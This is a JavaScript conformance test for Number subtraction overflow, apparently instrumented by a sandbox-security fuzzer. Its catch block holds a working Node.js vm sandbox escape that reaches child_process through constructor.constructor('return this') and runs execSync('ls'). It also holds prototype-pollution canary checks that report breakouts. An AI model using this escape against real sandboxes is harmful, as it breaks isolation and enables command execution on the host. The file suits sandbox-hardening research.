try {
    if (Number.MAX_VALUE - -Number.MAX_VALUE !== Number.POSITIVE_INFINITY) {
        $ERROR('#1: Number.MAX_VALUE - -Number.MAX_VALUE === Number.POSITIVE_INFINITY. Actual: ' + (Number.MAX_VALUE - -Number.MAX_VALUE));
    }
    if (-Number.MAX_VALUE - Number.MAX_VALUE !== Number.NEGATIVE_INFINITY) {
        $ERROR('#2: -Number.MAX_VALUE - umber.MAX_VALUE === Number.NEGATIVE_INFINITY. Actual: ' + (-Number.MAX_VALUE - Number.MAX_VALUE));
    }
    if (1e+308 - -1e+308 !== Number.POSITIVE_INFINITY) {
        $ERROR('#3: 1e+308 - -1e+308 === Number.POSITIVE_INFINITY. Actual: ' + (1e+308 - -1e+308));
    }
    if (-8.99e+307 - 8.99e+307 !== Number.NEGATIVE_INFINITY) {
        $ERROR('#4: -8.99e+307 - 8.99e+307 === Number.NEGATIVE_INFINITY. Actual: ' + (-8.99e+307 - 8.99e+307));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}